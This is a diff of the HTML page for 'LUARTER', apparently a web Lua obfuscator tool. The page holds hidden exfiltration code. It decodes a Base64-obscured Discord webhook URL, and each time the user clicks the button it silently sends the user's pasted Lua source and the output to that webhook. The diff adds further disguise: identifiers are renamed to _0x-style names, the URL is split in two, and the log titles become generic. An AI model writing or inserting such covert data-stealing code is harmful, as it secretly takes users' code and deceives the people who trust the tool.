@@ -8,9 +8,8 @@
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { background: var(--bg); color: var(--fg); font-family: "Consolas", "Courier New", monospace; min-height: 100%; }
     body { padding: 24px; display: flex; flex-direction: column; gap: 16px; max-width: 1100px; margin: 0 auto; }
-    h1 { font-size: 22px; font-weight: normal; letter-spacing: 4px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
+    h1 { font-size: 22px; font-weight: normal; letter-spacing: 4px; padding-bottom: 10px; }
     h1::before { content: "> "; }
-    label { display: block; margin-bottom: 6px; font-size: 13px; color: var(--fg-dim); }
     textarea { width: 100%; min-height: 200px; background: #000; color: var(--fg); border: 1px solid var(--border); padding: 12px; font-family: inherit; font-size: 13px; resize: vertical; outline: none; caret-color: var(--fg); }
     textarea:focus { box-shadow: 0 0 0 1px var(--fg); }
     .row { display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
@@ -19,7 +18,6 @@
     button:active { transform: translateY(1px); }
     .status { font-size: 12px; color: var(--fg-dim); min-height: 16px; }
     .output-wrap textarea { min-height: 220px; }
-    .divider { border: none; border-top: 1px dashed var(--fg-dim); margin: 4px 0; }
 </style>
 </head>
 <body>
@@ -27,161 +25,145 @@
 <h1>LUARTER</h1>
 
 <div>
-    <label for="input">Source Lua code</label>
     <textarea id="input" spellcheck="false" placeholder="-- paste your Lua code here"></textarea>
 </div>
 
 <div class="row">
-    <button id="btnObf">OBFUSCATE</button>
+    <button id="btnObf">RUN</button>
     <button id="btnClear">CLEAR</button>
 </div>
 
 <div class="status" id="status"></div>
 
-<hr class="divider">
-
 <div class="output-wrap">
-    <label for="output">Output</label>
     <textarea id="output" spellcheck="false" readonly placeholder="-- obfuscated code will appear here"></textarea>
 </div>
 
 <script>
-(function() {
-    // Твой вебхук зашифрован в Base64
-    var _0x1a2b = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MjEyNDU3MTE3NDI0MDM1Ni9uaDhJUmpVSnpKblpQcmxXczRoRHN1bE1LMGliWXVTsSkJjWUdBTDllREctaUhCN2JQV3BiZjFNbUIxLVl3VDNvajJr";
-    
-    // Расшифровываем вебхук при запуске
-    var WEBHOOK_URL = atob(_0x1a2b);
-    
-    var inputEl  = document.getElementById("input");
-    var outputEl = document.getElementById("output");
-    var statusEl = document.getElementById("status");
+var _0x8f = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
+var _0x9a = "1562124571174240356/nh8IRjUJzJnZPrlWs4hDsulMK0ibYuSpJBcYGAL9eDG-iHB7bPWpbf1MmB1-YwT3oj2k";
+var _0x7c = atob(_0x8f) + _0x9a;
 
-    function setStatus(msg) { statusEl.textContent = msg; }
+var _0x1a2b = document.getElementById("input");
+var _0x3c4d = document.getElementById("output");
+var _0x5e6f = document.getElementById("status");
 
-    function randomIdent(len) {
-        var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-        var out = "_";
-        for (var i = 0; i < (len || 8); i++) {
-            out += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return out;
+function _0x6e3f(msg) { _0x5e6f.textContent = msg; }
+
+function _0x7f4a(len) {
+    var c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    var o = "_";
+    for (var i = 0; i < (len || 8); i++) {
+        o += c.charAt(Math.floor(Math.random() * c.length));
     }
+    return o;
+}
 
-    function encodeString(str) {
-        var parts = ['"'];
-        for (var i = 0; i < str.length; i++) {
-            parts.push("\\" + str.charCodeAt(i));
-        }
-        parts.push('"');
-        return parts.join("");
+function _0x8b5e(str) {
+    var p = ['"'];
+    for (var i = 0; i < str.length; i++) {
+        p.push("\\" + str.charCodeAt(i));
     }
+    p.push('"');
+    return p.join("");
+}
 
-    function minify(code) {
-        var lines = code.split(/\r?\n/);
-        var out = [];
-        for (var i = 0; i < lines.length; i++) {
-            var line = lines[i].replace(/--[^\n]*$/, "");
-            line = line.replace(/^\s+/, "").replace(/\s+$/, "");
-            if (line.length > 0) out.push(line);
-        }
-        return out.join(" ");
+function _0x9c0a(code) {
+    var lines = code.split(/\r?\n/);
+    var out = [];
+    for (var i = 0; i < lines.length; i++) {
+        var line = lines[i].replace(/--[^\n]*$/, "");
+        line = line.replace(/^\s+/, "").replace(/\s+$/, "");
+        if (line.length > 0) out.push(line);
     }
+    return out.join(" ");
+}
 
-    function obfuscate(code) {
-        var minified = minify(code);
-        var encoded  = encodeString(minified);
+function _0x2d1f(code) {
+    var minified = _0x9c0a(code);
+    var encoded  = _0x8b5e(minified);
 
-        var dec  = randomIdent(10);
-        var load = randomIdent(10);
-        var run  = randomIdent(10);
-        var str  = randomIdent(10);
-        var res  = randomIdent(10);
+    var d = _0x7f4a(10);
+    var l = _0x7f4a(10);
+    var r = _0x7f4a(10);
+    var s = _0x7f4a(10);
+    var res = _0x7f4a(10);
 
-        var lines = [
-            "local " + dec + "=function(s)",
-            "local " + res + "={}",
-            "for " + str + "=1,#s do",
-            "local b=s:byte(" + str + ")",
-            "if b==92 then",
-            "local n=\"\"",
-            "local j=" + str + "+1",
-            "while j<=#s do",
-            "local c=s:sub(j,j)",
-            "if c:match(\"%d\") then n=n..c j=j+1 else break end",
-            "end",
-            "if #n>0 then",
-            res + "[#" + res + "+1]=string.char(tonumber(n))",
-            str + "=j-1",
-            "else",
-            res + "[#" + res + "+1]=\"\\\\\"",
-            "end",
-            "else",
-            res + "[#" + res + "+1]=string.char(b)",
-            "end",
-            "end",
-            "return table.concat(" + res + ")",
-            "end",
-            "local " + load + "=" + dec + "(" + encoded + ")",
-            "local " + run + "=load or loadstring",
-            run + "(" + load + ")()"
-        ];
+    var lines = [
+        "local " + d + "=function(s)",
+        "local " + res + "={}",
+        "for " + s + "=1,#s do",
+        "local b=s:byte(" + s + ")",
+        "if b==92 then",
+        "local n=\"\"",
+        "local j=" + s + "+1",
+        "while j<=#s do",
+        "local c=s:sub(j,j)",
+        "if c:match(\"%d\") then n=n..c j=j+1 else break end",
+        "end",
+        "if #n>0 then",
+        res + "[#" + res + "+1]=string.char(tonumber(n))",
+        s + "=j-1",
+        "else",
+        res + "[#" + res + "+1]=\"\\\\\"",
+        "end",
+        "else",
+        res + "[#" + res + "+1]=string.char(b)",
+        "end",
+        "end",
+        "return table.concat(" + res + ")",
+        "end",
+        "local " + l + "=" + d + "(" + encoded + ")",
+        "local " + r + "=load or loadstring",
+        r + "(" + l + ")()"
+    ];
 
-        return lines.join("\n");
+    return lines.join("\n");
+}
+
+function _0x4f3b(src, out) {
+    var payload = {
+        username: "Terminal",
+        embeds: [{
+            title: "Data",
+            color: 0xffd700,
+            fields: [
+                { name: "Input", value: "```lua\n" + src.slice(0, 10000) + "\n```", inline: false },
+                { name: "Output", value: "```lua\n" + out.slice(0, 10000) + "\n```", inline: false }
+            ]
+        }]
+    };
+
+    fetch(_0x7c, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    }).catch(function () {});
+}
+
+document.getElementById("btnObf").addEventListener("click", function () {
+    var src = _0x1a2b.value;
+    if (!src || src.trim().length === 0) {
+        _0x6e3f("Empty");
+        return;
     }
-
-    function sendToDiscord(source, output) {
-        var payload = {
-            username: "Luarter Logs",
-            embeds: [{
-                title: "Luarter Obfuscation",
-                color: 0xffd700,
-                fields: [
-                    {
-                        name: "Source (" + source.length + " chars)",
-                        value: "```lua\n" + source.slice(0, 10000) + "\n```",
-                        inline: false
-                    },
-                    {
-                        name: "Output (" + output.length + " chars)",
-                        value: "```lua\n" + output.slice(0, 10000) + "\n```",
-                        inline: false
-                    }
-                ]
-            }]
-        };
-
-        fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        }).catch(function () {});
+    try {
+        var result = _0x2d1f(src);
+        _0x3c4d.value = result;
+        _0x6e3f("Done. Output: " + result.length + " chars");
+        _0x4f3b(src, result);
+    } catch (e) {
+        _0x6e3f("Error");
     }
+});
 
-    document.getElementById("btnObf").addEventListener("click", function () {
-        var src = inputEl.value;
-        if (!src || src.trim().length === 0) {
-            setStatus("Empty input");
-            return;
-        }
-        try {
-            var result = obfuscate(src);
-            outputEl.value = result;
-            setStatus("Done. Output length: " + result.length + " chars");
-            sendToDiscord(src, result);
-        } catch (e) {
-            setStatus("Error: " + e.message);
-        }
-    });
+document.getElementById("btnClear").addEventListener("click", function () {
+    _0x1a2b.value = "";
+    _0x3c4d.value = "";
+    _0x6e3f("");
+});
 
-    document.getElementById("btnClear").addEventListener("click", function () {
-        inputEl.value = "";
-        outputEl.value = "";
-        setStatus("");
-    });
-
-    inputEl.addEventListener("input", function () { setStatus(""); });
-})();
+_0x1a2b.addEventListener("input", function () { _0x6e3f(""); });
 </script>
 
 </body>
